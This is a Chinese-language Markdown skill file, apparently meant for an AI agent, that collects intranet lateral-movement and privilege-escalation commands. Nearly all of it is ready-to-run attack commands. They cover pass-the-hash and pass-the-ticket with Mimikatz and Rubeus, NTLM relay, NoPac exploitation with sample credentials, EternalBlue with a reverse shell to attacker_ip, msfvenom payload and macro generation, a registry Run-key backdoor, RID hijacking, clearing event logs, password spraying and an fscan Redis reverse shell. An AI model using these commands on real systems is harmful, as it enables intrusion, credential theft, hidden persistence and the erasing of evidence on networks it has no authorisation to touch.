---
name: lateral-lateral-movement
description: Use when encountering 内网横向移动和权限扩展技术
---

# 横向移动

## Info

- **Domain**: intranet
- **Tags**: intranet, lateral, movement

## 1. PsExec

### Impacket

```bash
psexec.py domain/user:password@target_ip
psexec.py -hashes LMHASH:NTHASH user@target_ip
```

### Metasploit

```bash
use exploit/windows/smb/psexec
set RHOSTS target_ip
set SMBUser admin
set SMBPass password
```

---

## 2. WMI

### Impacket

```bash
wmiexec.py domain/user:password@target_ip
```

### PowerShell

```powershell
Get-WmiObject -Class Win32_Process -ComputerName target_ip
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip
```

---

## 3. Pass-the-Hash

### Impacket

```bash
psexec.py -hashes LMHASH:NTHASH user@target_ip
wmiexec.py -hashes LMHASH:NTHASH user@target_ip
```

### CrackMapExec

```bash
crackmapexec smb target_ip -u admin -H NTHASH
```

---

## 4. Pass-the-Ticket

### Mimikatz

```bash
privilege::debug
sekurlsa::tickets /export
kerberos::ppt ticket.kirbi
```

### Rubeus

```bash
Rubeus.exe dump
Rubeus.exe ptt /ticket:ticket.kirbi
```

---

## 5. NTLM Relay

### Impacket

```bash
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t smb://target_ip -c 'whoami'
```

### Responder

```bash
responder -I eth0
```

---

## 6. WinRM

### Evil-WinRM

```bash
evil-winrm -i target_ip -u user -p password
evil-winrm -i target_ip -u user -H NTHASH
```

### CrackMapExec

```bash
crackmapexec winrm target_ip -u admin -p password -x "whoami"
```

---

## 7. DCOM

### PowerShell

```powershell
$dcom = [System.Management.Automation.AutomationType]::GetType("System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35")->GetMethod("CreateInstance", [System.Reflection.BindingFlags]"Public,Static,IgnoreCase", $null, @([System.Type]::GetType("System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")), $null)
$obj = $dcom.Invoke($null, "MMC20.Application", "TargetComputer")
```

---

## 8. SMBExec

### Impacket

```bash
smbexec.py domain/user:password@target_ip
```

---

## 9. ATExec

### Impacket

```bash
atexec.py domain/user:password@target_ip "command"
```

---

## 10. SSH横向

### 密钥利用

```bash
ssh -i id_rsa user@target_ip
```

### 端口转发

```bash
ssh -L 8080:target2:80 user@jump_host
```

---

## 11. NoPac 提权（CVE-2021-42278 + CVE-2021-42287）

**原理**: 创建与域控同名的机器账户（无 `$`），利用 KDC 逻辑缺陷获取高权限票据。

**前提**: `MachineAccountQuota > 0`（默认 10），域功能级别 ≤ Server 2016。

```bash
# 检测
python3 noPac.py xiaorang.lab/bob:Password123 -check -dc-ip 172.22.11.6

# 创建同名账户 + 申请票据
python3 noPac.py xiaorang.lab/bob:Password123 -dc-ip 172.22.11.6 \
  --impersonate administrator -use-ldap

# 使用票据登录
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass xiaorang.lab/administrator@DC01.xiaorang.lab
```

---

## 12. RDP 会话接管

**前提**: SYSTEM 权限 shell + 目标有活跃 RDP 会话。

```cmd
# 查看会话
query session

# 接管（ID=2 的 RDP 会话）
tscon 2 /dest:console
```

远程连接：
```bash
xfreerdp /v:target_ip /u:user /p:pass /cert:ignore +clipboard
```

---

## 13. 永恒之蓝（MS17-010）

```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit

# fscan 内置利用（添加用户）
fscan.exe -h target_ip -m ms17010 -sc add
# 用户名: sysadmin 密码: 1qaz@WSX!@#4
```

---

## 14. 注册表修改利用

### 开启远程桌面

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### RID 劫持（Guest → Administrator）

```cmd
# 以 SYSTEM 运行
psexec.exe -s -i regedit
# 导航到 HKLM\SAM\SAM\Domains\Account\Users\000001F5
# 修改 F 值偏移 0x30: F5 01 → F4 01（RID 501 → 500）
# 修改 F 值偏移 0x38: 15 02 → 14 02（启用）
```

### 自启动持久化

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```

### 文件关联挟持

```cmd
reg add "HKEY_CLASSES_ROOT\inifile\shell\open\command" /ve /t REG_SZ /d "\"C:\Windows\Temp\payload.exe\" \"%1\"" /f
```

---

## 15. Meterpreter Shell 获取

```bash
# MSF 监听
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit

# msfvenom 生成
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o evil.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f vba -o macro.vba
```

### 后渗透操作

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > ps
meterpreter > migrate -N spoolsv.exe
meterpreter > shell
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > clearev
```

---

## 16. Heap Dump 信息泄露

Java 内存转储可能包含明文密码、Session、API 密钥。

```bash
# JDumpSpider 分析
java -jar JDumpSpider-full.jar heapdump.hprof

# 导出所有字符串
java -jar JDumpSpider-full.jar heapdump.hprof export-strings -out all_strings.txt
```

MAT（Memory Analyzer）OQL 查询：
```sql
-- 查找 Session
SELECT s.id.toString() FROM org.apache.catalina.session.StandardSession s WHERE s.isValid = true

-- 查找 HTTP 请求
SELECT h.byteBuffer.hb.toString() FROM org.apache.coyote.http11.Http11InputBuffer h

-- 查找路由
SELECT key.toString() FROM java.util.LinkedHashMap$Entry entry WHERE (key.toString() LIKE "/%")
```

---

## 17. CrackMapExec 速查

```bash
# SMB 密码喷洒
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# 哈希传递
crackmapexec smb target_ip -u admin -H NTHASH

# 远程命令执行
crackmapexec smb target_ip -u user -p pass -x "whoami"
crackmapexec smb target_ip -u user -p pass -X "Get-Process"

# 加载模块
crackmapexec smb target_ip -u user -p pass -M webdav
crackmapexec smb target_ip -u user -p pass -M mimikatz

# WINRM
crackmapexec winrm target_ip -u admin -p password -x "whoami"
```

---

## 18. fscan 速查

```bash
# 全模块扫描
fscan.exe -h 192.168.1.1/24

# 跳过存活检测、不保存文件、跳过 POC
fscan.exe -h 192.168.1.1/24 -np -no -nopoc

# Redis 写公钥
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub

# Redis 反弹 shell
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666

# SSH 爆破后执行命令
fscan.exe -h 192.168.1.1/24 -c whoami

# MS17-010
fscan.exe -h 192.168.1.1/24 -m ms17010

# 指定端口
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222

# 代理扫描
fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080
```